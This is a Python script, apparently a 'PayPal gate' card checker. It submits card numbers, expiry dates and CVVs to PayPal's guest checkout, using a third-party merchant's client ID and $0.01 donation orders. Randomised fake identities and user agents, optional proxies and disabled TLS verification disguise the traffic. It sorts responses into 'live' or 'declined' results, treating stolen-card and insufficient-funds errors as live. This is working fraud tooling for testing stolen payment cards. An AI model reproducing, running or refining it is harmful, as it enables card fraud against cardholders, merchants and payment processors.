import httpx
import asyncio
import random
import string
import json
import time
import re
import base64
import os
import logging
from html import unescape

logger = logging.getLogger("paypal_gate")

PAYPAL_GQL = "https://www.paypal.com/graphql"
MERCHANT_URL = "https://ghcop.org/"
CLIENT_ID = "ARYdv_vDNM2i4bIIp6AsnT7nBcSukYDLI-ghgbbh-1V-98FvyTv4DrIMHi-JRoixTKv321rsjVFyTaMf"

UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
]

GQL_MUTATION = """
    mutation payWithCard(
        $token: String!
        $card: CardInput!
        $phoneNumber: String
        $firstName: String
        $lastName: String
        $shippingAddress: AddressInput
        $billingAddress: AddressInput
        $email: String
        $currencyConversionType: CheckoutCurrencyConversionType
        $installmentTerm: Int
    ) {
        approveGuestPaymentWithCreditCard(
            token: $token
            card: $card
            phoneNumber: $phoneNumber
            firstName: $firstName
            lastName: $lastName
            email: $email
            shippingAddress: $shippingAddress
            billingAddress: $billingAddress
            currencyConversionType: $currencyConversionType
            installmentTerm: $installmentTerm
        ) {
            flags {
                is3DSecureRequired
            }
            cart {
                intent
                cartId
                buyer {
                    userId
                    auth {
                        accessToken
                    }
                }
                returnUrl {
                    href
                }
            }
            paymentContingencies {
                threeDomainSecure {
                    status
                    method
                    redirectUrl {
                        href
                    }
                    parameter
                }
            }
        }
    }
"""

FUNDING_ELIGIBILITY = {
    "paypal": {"eligible": True, "vaultable": False},
    "paylater": {"eligible": False, "products": {"payIn3": {"eligible": False, "variant": None}, "payIn4": {"eligible": False, "variant": None}, "paylater": {"eligible": False, "variant": None}}},
    "card": {"eligible": True, "branded": False, "installments": False, "vendors": {"visa": {"eligible": True, "vaultable": True}, "mastercard": {"eligible": True, "vaultable": True}, "amex": {"eligible": True, "vaultable": True}, "discover": {"eligible": False, "vaultable": True}, "hiper": {"eligible": False, "vaultable": False}, "elo": {"eligible": False, "vaultable": True}, "jcb": {"eligible": False, "vaultable": True}}, "guestEnabled": False},
    "venmo": {"eligible": False},
    "itau": {"eligible": False},
    "credit": {"eligible": False},
    "applepay": {"eligible": False},
    "sepa": {"eligible": False},
    "ideal": {"eligible": False},
    "bancontact": {"eligible": False},
    "giropay": {"eligible": False},
    "eps": {"eligible": False},
    "sofort": {"eligible": False},
    "mybank": {"eligible": False},
    "p24": {"eligible": False},
    "trustly": {"eligible": False},
    "oxxo": {"eligible": False},
    "maxima": {"eligible": False},
    "boleto": {"eligible": False},
    "mercadopago": {"eligible": False},
    "multibanco": {"eligible": False},
    "satispay": {"eligible": False},
    "payu": {"eligible": False},
    "blik": {"eligible": False},
}


def _uid():
    return "uid_" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + "_" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=11))


def _capture(text, start_delim, end_delim):
    idx = text.find(start_delim)
    if idx == -1:
        return ""
    idx += len(start_delim)
    end_idx = text.find(end_delim, idx)
    if end_idx == -1:
        return ""
    return text[idx:end_idx]


def _random_name():
    first = ["James", "John", "Michael", "William", "David", "Robert", "Thomas", "Charles", "Chris", "Daniel",
             "Matthew", "Anthony", "Joseph", "Andrew", "Ryan", "Kevin", "Brian", "Steven", "Mark", "Edward"]
    last = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Wilson", "Anderson",
            "Taylor", "Thomas", "Moore", "Martin", "Jackson", "Thompson", "White", "Harris", "Clark", "Lewis"]
    return random.choice(first), random.choice(last)


def _random_address():
    data = [
        ("123 Main St", "New York", "NY", "10001"),
        ("456 Oak Ave", "Los Angeles", "CA", "90001"),
        ("789 Pine Rd", "Chicago", "IL", "60601"),
        ("321 Elm St", "Houston", "TX", "77001"),
        ("654 Maple Dr", "Phoenix", "AZ", "85001"),
        ("111 Cedar Ln", "Seattle", "WA", "98101"),
        ("222 Birch Ct", "Denver", "CO", "80201"),
        ("333 Walnut Way", "Atlanta", "GA", "30301"),
        ("444 Spruce Blvd", "Miami", "FL", "33101"),
        ("555 Ash Pl", "Boston", "MA", "02101"),
    ]
    return random.choice(data)


def _random_email():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=12)) + "@gmail.com"


def _build_sdk_meta(client_id, data_uid):
    meta = {
        "url": f"https://www.paypal.com/sdk/js?client-id={client_id}&currency=USD",
        "attrs": {
            "data-sdk-integration-source": "button-factory",
            "data-uid": data_uid,
        }
    }
    return base64.urlsafe_b64encode(json.dumps(meta, separators=(',', ':')).encode()).decode().rstrip('=')


def _build_funding_eligibility():
    return base64.urlsafe_b64encode(json.dumps(FUNDING_ELIGIBILITY, separators=(',', ':')).encode()).decode().rstrip('=')


async def paypal_check(cc, mm, yy, cvv, proxy=None):
    start = time.time()

    if len(yy) == 2:
        exp_date = f"{mm}/20{yy}"
    else:
        exp_date = f"{mm}/{yy}"
    mm = mm.zfill(2)

    first, last = _random_name()
    street, city, state, zipcode = _random_address()
    email = _random_email()
    phone = "1" + "".join(random.choices(string.digits, k=10))
    ua = random.choice(UA_LIST)

    corr_id = ''.join(random.choices(string.hexdigits[:16], k=13))
    storage_id = _uid()
    session_id = _uid()
    btn_session_id = _uid()
    data_uid = _uid()

    client_kwargs = dict(
        timeout=httpx.Timeout(25),
        follow_redirects=True,
        headers={"User-Agent": ua},
    )
    if proxy:
        client_kwargs["proxy"] = proxy

    try:
        async with httpx.AsyncClient(**client_kwargs) as client:
            client_id = CLIENT_ID

            sdk_meta = _build_sdk_meta(client_id, data_uid)
            funding_elig = _build_funding_eligibility()

            buttons_url = (
                f"https://www.paypal.com/smart/buttons?style.label=donate&style.layout=vertical"
                f"&style.color=gold&style.shape=rect&style.tagline=false&style.menuPlacement=below"
                f"&sdkVersion=5.0.390&components.0=buttons&locale.lang=en&locale.country=US"
                f"&sdkMeta={sdk_meta}"
                f"&clientID={client_id}"
                f"&sdkCorrelationID={corr_id}"
                f"&storageID={storage_id}"
                f"&sessionID={session_id}"
                f"&buttonSessionID={btn_session_id}"
                f"&env=production&buttonSize=medium"
                f"&fundingEligibility={funding_elig}"
            )

            r1 = await client.get(
                buttons_url,
                headers={
                    "Host": "www.paypal.com",
                    "Referer": MERCHANT_URL,
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                },
            )

            if r1.status_code != 200:
                elapsed = round(time.time() - start, 2)
                return f"Error - PayPal buttons failed ({r1.status_code}) [{elapsed}s]"

            token_raw = _capture(r1.text, '"facilitatorAccessToken":"', '"')
            if not token_raw:
                elapsed = round(time.time() - start, 2)
                return f"Error - No facilitator token [{elapsed}s]"
            token = unescape(token_raw.strip())

            order_payload = {
                "purchase_units": [{
                    "amount": {
                        "currency_code": "USD",
                        "value": "0.01",
                        "breakdown": {
                            "item_total": {"currency_code": "USD", "value": "0.01"}
                        }
                    },
                    "items": [{
                        "name": "Donation",
                        "unit_amount": {"currency_code": "USD", "value": "0.01"},
                        "quantity": "1",
                        "category": "DONATION"
                    }],
                    "description": "Donation"
                }],
                "intent": "CAPTURE",
                "application_context": {}
            }

            r2 = await client.post(
                "https://www.paypal.com/v2/checkout/orders",
                json=order_payload,
                headers={
                    "Content-Type": "application/json",
                    "Authorization": f"Bearer {token}",
                    "Referer": buttons_url,
                },
            )

            if r2.status_code not in (200, 201):
                elapsed = round(time.time() - start, 2)
                return f"Error - Order creation failed ({r2.status_code}) [{elapsed}s]"

            order_id = _capture(r2.text, '"id":"', '"')
            if not order_id:
                elapsed = round(time.time() - start, 2)
                return f"Error - No order ID [{elapsed}s]"

            card_fields_referer = (
                f"https://www.paypal.com/smart/card-fields?"
                f"sessionID={session_id}&buttonSessionID={btn_session_id}"
                f"&locale.x=en_US&commit=true&env=production"
                f"&sdkMeta={sdk_meta}"
                f"&disable-card=&token={order_id}"
            )

            gql_payload = {
                "query": GQL_MUTATION,
                "variables": {
                    "token": order_id,
                    "card": {
                        "cardNumber": cc,
                        "expirationDate": exp_date,
                        "postalCode": zipcode,
                        "securityCode": cvv,
                    },
                    "phoneNumber": phone,
                    "firstName": first,
                    "lastName": last,
                    "billingAddress": {
                        "givenName": first,
                        "familyName": last,
                        "line1": street,
                        "line2": None,
                        "city": city,
                        "state": state,
                        "postalCode": zipcode,
                        "country": "US",
                    },
                    "shippingAddress": {
                        "givenName": first,
                        "familyName": last,
                        "line1": street,
                        "line2": None,
                        "city": city,
                        "state": state,
                        "postalCode": zipcode,
                        "country": "US",
                    },
                    "email": email,
                    "currencyConversionType": "PAYPAL",
                },
                "operationName": "payWithCard",
            }

        async with httpx.AsyncClient(
            timeout=httpx.Timeout(25),
            follow_redirects=True,
            verify=False,
            headers={"User-Agent": ua},
        ) as gql_client:
            r3 = await gql_client.post(
                PAYPAL_GQL,
                json=gql_payload,
                headers={
                    "Content-Type": "application/json",
                    "Origin": "https://www.paypal.com",
                },
            )

            elapsed = round(time.time() - start, 2)
            result_text = r3.text

            try:
                result_json = r3.json()
            except Exception:
                if "<html" in result_text.lower():
                    logger.warning("GQL returned HTML instead of JSON for %s", cc[:6])
                    return f"Declined - Auth Challenge | {cc[:6]} [{elapsed}s]"
                result_json = {}

            txt = json.dumps(result_json).lower() if result_json else result_text.lower()

            if "is3dsecurerequired" in txt:
                flags = (
                    result_json.get("data", {})
                    .get("approveGuestPaymentWithCreditCard", {})
                    .get("flags", {})
                )
                if flags and flags.get("is3DSecureRequired"):
                    return f"Approved - 3DS Required | {cc[:6]} [{elapsed}s]"
                return f"Approved - Charged $0.01 | {cc[:6]} [{elapsed}s]"

            if "thank you" in txt or '"status":"completed"' in txt:
                return f"Approved - Charged $0.01 | {cc[:6]} [{elapsed}s]"

            live_indicators = [
                "insufficient_funds", "do_not_honor", "lost_card", "stolen_card",
                "pickup_card", "restricted_card", "card_velocity_exceeded",
                "exceeds_amount_limit", "transaction_refused",
            ]
            for indicator in live_indicators:
                if indicator in txt:
                    tag = indicator.replace("_", " ").title()
                    return f"Approved - {tag} | {cc[:6]} [{elapsed}s]"

            if "incorrect_cvv" in txt or "invalid_security_code" in txt or "cvv_check_failed" in txt:
                return f"Approved - CCN Live | {cc[:6]} [{elapsed}s]"

            if "processor_declined" in txt or "issuer_decline" in txt:
                msg = _capture(result_text, '"message":"', '"')
                code = _capture(result_text, '"code":"', '"')
                detail = msg or code or "Issuer Decline"
                return f"Declined - {detail[:60]} | {cc[:6]} [{elapsed}s]"

            if "card_generic_error" in txt:
                return f"Declined - Card Error | {cc[:6]} [{elapsed}s]"

            if "invalid_card_number" in txt:
                return f"Declined - Invalid Card Number | {cc[:6]} [{elapsed}s]"

            if "expired_card" in txt:
                return f"Declined - Expired Card | {cc[:6]} [{elapsed}s]"

            if "card_declined" in txt or "generic_decline" in txt:
                return f"Declined - Card Declined | {cc[:6]} [{elapsed}s]"

            errors = result_json.get("errors", [])
            if errors:
                err0 = errors[0]
                msg = err0.get("message", "")
                err_data = err0.get("data", [])
                if isinstance(err_data, list) and err_data:
                    code = err_data[0].get("code", "")
                    if code:
                        return f"Declined - {code} | {cc[:6]} [{elapsed}s]"
                details = err0.get("details", [])
                if isinstance(details, list) and details:
                    issue = details[0].get("issue", "")
                    desc = details[0].get("description", "")
                    if issue:
                        return f"Declined - {issue} | {cc[:6]} [{elapsed}s]"
                    if desc:
                        return f"Declined - {desc[:60]} | {cc[:6]} [{elapsed}s]"
                if msg:
                    return f"Declined - {msg[:60]} | {cc[:6]} [{elapsed}s]"
                return f"Declined - Unknown Error | {cc[:6]} [{elapsed}s]"

            data = result_json.get("data", {})
            approve = data.get("approveGuestPaymentWithCreditCard")
            if approve is not None:
                return f"Approved - Charged $0.01 | {cc[:6]} [{elapsed}s]"

            msg = _capture(result_text, '"message":"', '"')
            code = _capture(result_text, '"code":"', '"')
            if msg or code:
                return f"Declined - {(msg or code)[:60]} | {cc[:6]} [{elapsed}s]"

            logger.debug("Unknown response for %s: %s", cc[:6], result_text[:300])
            return f"Declined - Unknown Response | {cc[:6]} [{elapsed}s]"

    except (httpx.ConnectTimeout, httpx.ReadTimeout, httpx.WriteTimeout, httpx.PoolTimeout):
        elapsed = round(time.time() - start, 2)
        return f"Error - PayPal Timeout [{elapsed}s]"
    except httpx.NetworkError:
        elapsed = round(time.time() - start, 2)
        return f"Error - Network Error [{elapsed}s]"
    except Exception as e:
        elapsed = round(time.time() - start, 2)
        return f"Error - {str(e)[:80]} [{elapsed}s]"
